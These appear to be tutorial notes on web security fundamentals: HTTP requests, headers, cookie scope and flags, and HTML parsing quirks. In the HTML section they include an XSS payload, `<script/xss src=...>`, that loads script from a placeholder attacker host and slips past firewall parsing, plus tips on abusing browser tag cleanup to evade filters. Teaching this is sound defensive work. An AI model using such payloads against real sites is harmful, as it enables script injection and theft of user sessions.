### Requests
Basic HTTP request format is as follows:
```
VERB /resource/locator HTTP/1.1
header1: value1
header2: value2

<body of Request>
```

Headers and bodies are split by a simple new line and the verb represents your HTTP method (PUT/POST/GET etc).

#### Common headers
```
Host: indicates the desired host handling the request
Accept: Shows which MIME type(s) are accepted by the client makign the request. Normally used to specify if you want JSON/XML for web services.
Cookie: Passes cookie data to server
Referer: The page which lead to the request being made. NOTE this is not passed to other servers when using HTTPS on the origin.
Authorization: used for basic auth pages. Takes form "Basic <base64'd username:password>"
```
Basic auth has no encryption, it's just base64'd.

#### Cookies
These are key-value pairs of data. They are sent from the server and sit on the client for a specific length of time.

They have a scope associated with them to tell the browser where they are or are not valid.
Each cookie has a domain pattern that it applies to and they're passed with each request the client makes to matching hosts.

Common breaches of security are if you are able to set cookies where you shouldn't be or if cookies are going places they shouldn't be.

#### Cookie security
- Cookies added for .example.com can be read of ANY subdomain of example.com.
- Cookies added for a subdomain can only be read in that subdomain and it's subdomains.
- A subdomain is able to set cookies for it's own subdomains and parent but it can't set cookies for sibling domains.
For example, `test.example.com` can't set cookies on `test2.example.com` but **can** set them on `example.com` and `foo.test.example.com`.

We should keep this parent/child style hierarchy in mind when investigating as this is something people mess up a lot.

People will scope cookies where unauthorised/insecure code is running along side secure code and access the same cookies.

#### Cookie flags
We should note that there are two important flags to know for cookies.
- Secure: The cookie will only be accessible to HTTPS pages
- HTTPOnly: The cookie cannot be read by Javascript
The server indicates these flags in the Set-Cookie header that passes them in the first place.

Normally we can use `Document.cookie` attribute to check the cookies but if HTTPOnly is set, those cookies won't be read.

### HTML
#### Parsing
HTML **should** be parsed according to the relevant spec, which is generally HTML5 now.

When we're talking about security, it's often not just parsed by a web browser but often also Web-Application firewalls and other filters. If there is ever a discrepancy between how two items parse the same thing, there's often a vulnerability.

##### Example
If we go to `example.com/vulnerable?name=<script/xss%20src=http://evilsite.com/my.js>` and it generates:
```
<!doctype html><html>
  <head>
    <title>Vulnerable page named <script/xss src=http://evilsite.com/my.js></title>
  </head>
</html>
```
In this case, it's a simple script with a source attribute.
We notice that in the HTML we have `/xss` in our HTML. This does nothing as the `/` will be treated as whitespace and the xss becomes an empty html attribute when parsed by the browser.
With a webapp firewall improperly parsing HTML, a webapp firewall will see this as a html tag named "script/xss" and will allow it straight through the filter. This means the firewall doesn't see this as a script tag but user's browsers will due to differences in the HTML spec they're using to parse.

#### Legacy parsing
Browsers are built to handle the web. Due to decades of bad HTML, browsers are good at cleaning up after authors but these are often exploitable.
For example, a `<script>` tag with no closing tag will not error out the page completely but rather the browser will often complete the tag for you and just provide back some simple syntax errors.

Let's say we have a XSS attack in the URL and we can't put a slash in there because it's conisdered a path separator for URL's. This is a very common case scenario. In addition to the above, a tag missing it's closing angle bracket will usually be closed by the angle bracket of the next tag on the page.

So even having an open angle bracket inside another open angle bracket isn't valid by HTML spec but it is valid according to most browsers which will attempt to "cleanup" for you, allowing you to bypass many filters.
